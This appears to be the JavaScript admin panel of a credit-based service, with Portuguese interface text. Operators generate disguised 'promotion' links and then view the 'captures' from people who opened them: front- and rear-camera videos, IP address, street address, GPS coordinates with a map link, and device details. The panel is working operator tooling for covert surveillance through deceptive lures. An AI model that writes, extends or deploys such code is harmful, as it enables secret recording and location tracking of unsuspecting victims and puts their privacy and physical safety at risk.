// main.js
import { firebaseConfig } from '../config.js';

firebase.initializeApp(firebaseConfig);
const auth = firebase.auth();
const database = firebase.database();

class AdminPanel {
    constructor() {
        this.currentUser = null;
        this.userCredits = 1;

        this.initializeElements();
        this.setupEventListeners();
        this.checkAuthState();
        this.setupThemePreview();
    }

    initializeElements() {
        this.loginScreen = document.getElementById('loginScreen');
        this.mainPanel = document.getElementById('mainPanel');
        this.googleLoginBtn = document.getElementById('googleLoginBtn');
        this.logoutBtn = document.getElementById('logoutBtn');
        this.userName = document.getElementById('userName');
        this.userAvatar = document.getElementById('userAvatar');
        this.creditsDisplay = document.getElementById('creditsDisplay');
        this.generateUrlBtn = document.getElementById('generateUrlBtn');
        this.generatedUrlSection = document.getElementById('generatedUrlSection');
        this.generatedUrlInput = document.getElementById('generatedUrlInput');
        this.copyUrlBtn = document.getElementById('copyUrlBtn');
        this.urlsList = document.getElementById('urlsList');
        this.capturesList = document.getElementById('capturesList');

        this.themeTitle = document.getElementById('themeTitle');
        this.themeImageUrl = document.getElementById('themeImageUrl');
        this.themeDescription = document.getElementById('themeDescription');
        this.themeColor = document.getElementById('themeColor');
        this.themeEmoji = document.getElementById('themeEmoji');
        this.themePreview = document.getElementById('themePreview');
    }

    setupEventListeners() {
        this.googleLoginBtn.addEventListener('click', () => this.signInWithGoogle());
        this.logoutBtn.addEventListener('click', () => this.signOut());
        this.generateUrlBtn.addEventListener('click', () => this.generateUrl());
        this.copyUrlBtn.addEventListener('click', () => this.copyUrl());
    }

    setupThemePreview() {
        const updatePreview = () => {
            document.getElementById('previewTitle').textContent = this.themeTitle.value || '🩴 Sandálias Retrô';
            document.getElementById('previewDescription').textContent = this.themeDescription.value || 'Participe da nossa promoção exclusiva!';
            document.getElementById('previewEmoji').textContent = this.themeEmoji.value || '🩴';

            const img = document.getElementById('previewImage');
            if (this.themeImageUrl.value) {
                img.src = this.themeImageUrl.value;
                img.style.display = 'block';
            } else {
                img.style.display = 'none';
            }

            const colors = this.themeColor.value.split(',');
            this.themePreview.style.background = `linear-gradient(135deg, ${colors[0]}, ${colors[1]})`;
        };

        this.themeTitle.addEventListener('input', updatePreview);
        this.themeImageUrl.addEventListener('input', updatePreview);
        this.themeDescription.addEventListener('input', updatePreview);
        this.themeColor.addEventListener('change', updatePreview);
        this.themeEmoji.addEventListener('input', updatePreview);
        updatePreview();
    }

    checkAuthState() {
        auth.onAuthStateChanged((user) => {
            if (user) {
                this.currentUser = user;
                this.showMainPanel();
                this.loadUserData();
            } else {
                this.showLoginScreen();
            }
        });
    }

    async signInWithGoogle() {
        try {
            const provider = new firebase.auth.GoogleAuthProvider();
            provider.addScope('profile');
            provider.addScope('email');
            await auth.signInWithPopup(provider);
        } catch (error) {
            console.error('Erro no login:', error);
            alert('Erro ao fazer login. Tente novamente.');
        }
    }

    async signOut() {
        try {
            await auth.signOut();
        } catch (error) {
            console.error('Erro no logout:', error);
        }
    }

    showLoginScreen() {
        this.loginScreen.classList.remove('hidden');
        this.mainPanel.classList.add('hidden');
    }

    showMainPanel() {
        this.loginScreen.classList.add('hidden');
        this.mainPanel.classList.remove('hidden');
        this.userName.textContent = this.currentUser.displayName;
        this.userAvatar.src = this.currentUser.photoURL;
    }

    async loadUserData() {
        try {
            const userRef = database.ref(`users/${this.currentUser.uid}`);
            const snapshot = await userRef.once('value');

            if (!snapshot.exists()) {
                await userRef.set({
                    name: this.currentUser.displayName,
                    email: this.currentUser.email,
                    photoURL: this.currentUser.photoURL,
                    credits: 0,
                    createdAt: Date.now()
                });
            }

            userRef.child('credits').on('value', (snap) => {
                this.userCredits = snap.val() || 0;
                this.creditsDisplay.textContent = `Créditos: ${this.userCredits}`;
                this.generateUrlBtn.disabled = this.userCredits <= 0;
            });

            this.loadUrls();
            this.loadCaptures();
        } catch (error) {
            console.error('Erro ao carregar dados:', error);
        }
    }

    generateUrlId() {
        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
        return Array.from({ length: 10 }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
    }

    async generateUrl() {
        if (this.userCredits <= 0) {
            alert('Você não possui créditos suficientes para gerar uma URL.');
            return;
        }

        try {
            this.generateUrlBtn.disabled = true;
            this.generateUrlBtn.textContent = 'Gerando...';

            const now = Date.now();
            const urlId = this.generateUrlId();
            const campaignName = document.getElementById('campaignName').value || 'Sem nome';
            const maxUses = parseInt(document.getElementById('maxUses').value);
            const expirationDays = parseInt(document.getElementById('expirationTime').value);
            const expiresAt = expirationDays > 0 ? now + expirationDays * 86400000 : null;
            const initialStatus = document.getElementById('initialStatus').value;

            const themeData = {
                title: this.themeTitle.value || '🩴 Sandálias Retrô',
                imageUrl: this.themeImageUrl.value || '',
                description: this.themeDescription.value || 'Participe da nossa promoção exclusiva!',
                color: this.themeColor.value || '#667eea,#764ba2',
                emoji: this.themeEmoji.value || '🩴'
            };

            const urlData = {
                id: urlId,
                userId: this.currentUser.uid,
                campaignName,
                maxUses: maxUses > 0 ? maxUses : null,
                expiresAt,
                usedCount: 0,
                createdAt: now,
                lastUsed: null,
                status: initialStatus,
                theme: themeData
            };

            await database.ref(`urls/${urlId}`).set(urlData);
            await database.ref(`users/${this.currentUser.uid}/urls/${urlId}`).set(urlData);
            await database.ref(`users/${this.currentUser.uid}/credits`).set(this.userCredits - 1);

            const fullUrl = `${window.location.origin}/?id=${urlId}`;
            this.generatedUrlInput.value = fullUrl;
            this.generatedUrlSection.style.display = 'block';

            this.loadUrls();
        } catch (error) {
            console.error('Erro ao gerar URL:', error);
            alert('Erro ao gerar URL. Tente novamente.');
        } finally {
            this.generateUrlBtn.disabled = this.userCredits <= 0;
            this.generateUrlBtn.textContent = 'Gerar URL (Custa 1 crédito)';
        }
    }

    copyUrl() {
        const input = this.generatedUrlInput;
        input.select();
        input.setSelectionRange(0, 99999);
        document.execCommand("copy");
        alert("URL copiada!");
    }

    async loadUrls() {
        this.urlsList.innerHTML = `<div class="loading"><div class="spinner"></div>Carregando URLs...</div>`;
        const ref = database.ref(`users/${this.currentUser.uid}/urls`);

        try {
            const snapshot = await ref.once('value');
            const urls = snapshot.val();

            if (!urls) {
                this.urlsList.innerHTML = `<p style="color:white;">Nenhuma URL gerada ainda.</p>`;
                return;
            }

            const urlItems = Object.values(urls).reverse().map(data => {
                let status = data.status;
                const now = Date.now();

                if (data.expiresAt && now > data.expiresAt) {
                    status = 'expired';
                } else if (data.maxUses && data.usedCount >= data.maxUses) {
                    status = 'limited';
                }

                const statusClass = {
                    active: 'status-active',
                    expired: 'status-expired',
                    limited: 'status-limited',
                    inactive: 'status-inactive'
                }[status] || 'status-inactive';

                return `
                    <div class="url-item">
                        <div class="url-header">
                            <strong>${data.campaignName}</strong>
                            <span class="url-status ${statusClass}">${status}</span>
                        </div>
                        <div class="theme-info">
                            <p><strong>${data.theme?.emoji || '🩴'} ${data.theme?.title || ''}</strong></p>
                            <p>${data.theme?.description || ''}</p>
                        </div>
                        <div class="url-controls">
                            <input type="text" class="url-input" value="${window.location.origin}/?id=${data.id}" readonly>
                            <button class="copy-btn" onclick="navigator.clipboard.writeText('${window.location.origin}/?id=${data.id}').then(() => alert('Copiado!'))">Copiar</button>
                        </div>
                    </div>
                `;
            }).join('');

            this.urlsList.innerHTML = urlItems;
        } catch (error) {
            console.error('Erro ao carregar URLs:', error);
            this.urlsList.innerHTML = `<p style="color:red;">Erro ao carregar URLs.</p>`;
        }
    }

    async loadCaptures() {
        this.capturesList.innerHTML = `<div class="loading"><div class="spinner"></div>Carregando capturas...</div>`;

        try {
            const ref = database.ref(`users/${this.currentUser.uid}/captures`);
            const snapshot = await ref.once('value');
            const captures = snapshot.val();

            if (!captures) {
                this.capturesList.innerHTML = `<p style="color:white;">Nenhuma captura ainda.</p>`;
                return;
            }

            const items = Object.values(captures)
                .sort((a, b) => b.timestamp - a.timestamp)
                .map(c => {
                    const loc = c.localizacao || {};
                    const date = c.data ? new Date(c.data).toLocaleString('pt-BR') : '—';

                    const endereco = loc.endereco_completo
                        || [loc.rua, loc.numero, loc.bairro, loc.cidade, loc.regiao, loc.pais].filter(Boolean).join(', ')
                        || 'Localização não disponível';

                    // Dispositivo resumido: extrai o trecho entre parênteses do userAgent
                    const uaMatch = (c.userAgent || '').match(/\(([^)]+)\)/);
                    const dispositivo = uaMatch ? uaMatch[1] : (c.platform || '—');

                    // Botão Google Maps
                    const mapsBtn = (loc.latitude && loc.longitude)
                        ? `<a
                               href="https://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
                               target="_blank"
                               rel="noopener"
                               style="
                                   display:inline-flex;
                                   align-items:center;
                                   gap:6px;
                                   margin-top:12px;
                                   padding:8px 16px;
                                   background:#4285F4;
                                   color:#fff;
                                   border-radius:8px;
                                   font-size:0.82rem;
                                   font-weight:600;
                                   text-decoration:none;
                                   transition:opacity .2s;
                               "
                               onmouseover="this.style.opacity='.85'"
                               onmouseout="this.style.opacity='1'"
                           >📍 Abrir no Google Maps</a>`
                        : '';

                    // Vídeo frontal
                    const videoFrontal = c.videoFrontalUrl
                        ? `<div style="flex:1;min-width:0;">
                               <p style="font-size:0.72rem;color:#aaa;text-align:center;margin:0 0 5px;">📱 Câmera Frontal</p>
                               <video controls playsinline preload="metadata"
                                   style="width:100%;border-radius:8px;background:#000;display:block;">
                                   <source src="${c.videoFrontalUrl}" type="video/webm">
                               </video>
                           </div>`
                        : '';

                    // Vídeo traseiro
                    const videoTraseira = c.videoTrasieraUrl
                        ? `<div style="flex:1;min-width:0;">
                               <p style="font-size:0.72rem;color:#aaa;text-align:center;margin:0 0 5px;">🔭 Câmera Traseira</p>
                               <video controls playsinline preload="metadata"
                                   style="width:100%;border-radius:8px;background:#000;display:block;">
                                   <source src="${c.videoTrasieraUrl}" type="video/webm">
                               </video>
                           </div>`
                        : '';

                    // Fallback para capturas antigas com videoUrl único
                    const videoLegacy = (!c.videoFrontalUrl && !c.videoTrasieraUrl && c.videoUrl)
                        ? `<div style="width:100%;">
                               <p style="font-size:0.72rem;color:#aaa;margin:0 0 5px;">🎥 Vídeo</p>
                               <video controls playsinline preload="metadata"
                                   style="width:100%;border-radius:8px;background:#000;display:block;">
                                   <source src="${c.videoUrl}" type="video/webm">
                               </video>
                           </div>`
                        : '';

                    return `
                        <div style="
                            background: rgba(255,255,255,0.06);
                            border: 1px solid rgba(255,255,255,0.12);
                            border-radius: 14px;
                            padding: 16px;
                            margin-bottom: 20px;
                        ">
                            <!-- Vídeos lado a lado -->
                            <div style="display:flex;gap:12px;flex-wrap:wrap;margin-bottom:14px;">
                                ${videoFrontal}
                                ${videoTraseira}
                                ${videoLegacy}
                            </div>

                            <!-- Metadados em grid -->
                            <div style="
                                display:grid;
                                grid-template-columns: repeat(auto-fit, minmax(170px, 1fr));
                                gap:12px;
                                font-size:0.83rem;
                                color:#ddd;
                            ">
                                <div>
                                    <span style="display:block;font-size:0.7rem;color:#888;margin-bottom:3px;text-transform:uppercase;letter-spacing:.5px;">🕐 Data e Hora</span>
                                    ${date}
                                </div>
                                <div>
                                    <span style="display:block;font-size:0.7rem;color:#888;margin-bottom:3px;text-transform:uppercase;letter-spacing:.5px;">🌐 IP</span>
                                    ${c.ip || '—'}
                                </div>
                                <div style="grid-column: 1 / -1;">
                                    <span style="display:block;font-size:0.7rem;color:#888;margin-bottom:3px;text-transform:uppercase;letter-spacing:.5px;">📍 Localização</span>
                                    ${endereco}
                                </div>
                                <div style="grid-column: 1 / -1;">
                                    <span style="display:block;font-size:0.7rem;color:#888;margin-bottom:3px;text-transform:uppercase;letter-spacing:.5px;">📟 Dispositivo</span>
                                    ${dispositivo}
                                </div>
                            </div>

                            ${mapsBtn}
                        </div>
                    `;
                }).join('');

            this.capturesList.innerHTML = items;

        } catch (error) {
            console.error('Erro ao carregar capturas:', error);
            this.capturesList.innerHTML = `<p style="color:red;">Erro ao carregar capturas.</p>`;
        }
    }
}

window.addEventListener('DOMContentLoaded', () => {
    new AdminPanel();
});
